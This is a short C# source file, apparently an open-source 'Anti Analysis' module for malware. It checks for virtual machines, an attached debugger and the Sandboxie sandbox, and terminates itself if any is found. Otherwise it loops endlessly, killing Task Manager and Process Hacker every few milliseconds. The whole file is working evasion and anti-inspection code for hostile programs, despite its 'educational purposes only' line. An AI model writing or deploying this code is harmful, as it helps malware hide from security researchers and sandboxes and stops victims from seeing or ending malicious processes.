using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Management;
using System.Runtime.InteropServices;
using System.Threading;

//       │ Author     : NYAN CAT
//       │ Name       : Anti Analysis v0.2
//       │ Contact    : https://github.com/NYAN-x-CAT

//       This program is distributed for educational purposes only.


namespace Anti_Analysis
{
    class Program
    {
        static void Main()
        {

            RunAntiAnalysis();

            //Console.WriteLine($"VirtualMachine = {DetectVirtualMachine()}");
            //Console.WriteLine($"Debugger = {DetectDebugger()}");
            //Console.WriteLine($"Sandboxie = {DetectSandboxie()}");
            //Console.ReadKey();
        }

        public static void RunAntiAnalysis()
        {
            if (DetectVirtualMachine() || DetectDebugger() || DetectSandboxie())
                Environment.FailFast(null);

            while (true)
            {
                DetectProcess();
                Thread.Sleep(10);
            }
        }

        private static bool DetectVirtualMachine()
        {
            using (var searcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
            {
                using (var items = searcher.Get())
                {
                    foreach (var item in items)
                    {
                        string manufacturer = item["Manufacturer"].ToString().ToLower();
                        if ((manufacturer == "microsoft corporation" && item["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL"))
                            || manufacturer.Contains("vmware")
                            || item["Model"].ToString() == "VirtualBox")
                        {
                            return true;
                        }
                    }
                }
            }
            return false;
        }

        private static bool DetectDebugger()
        {
            bool isDebuggerPresent = false;
            CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
            return isDebuggerPresent;
        }

        private static bool DetectSandboxie()
        {
            if (GetModuleHandle("SbieDll.dll").ToInt32() != 0)
                return true;
            else
                return false;
        }


        private static void DetectProcess()
        {
            foreach (Process p in Process.GetProcesses())
            {
                try
                {
                    if (processName.Contains(p.ProcessName))
                        p.Kill();
                }
                catch { }
            }
        }


        private readonly static List<string> processName = new List<string> { "ProcessHacker", "taskmgr" };

        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
    }
}
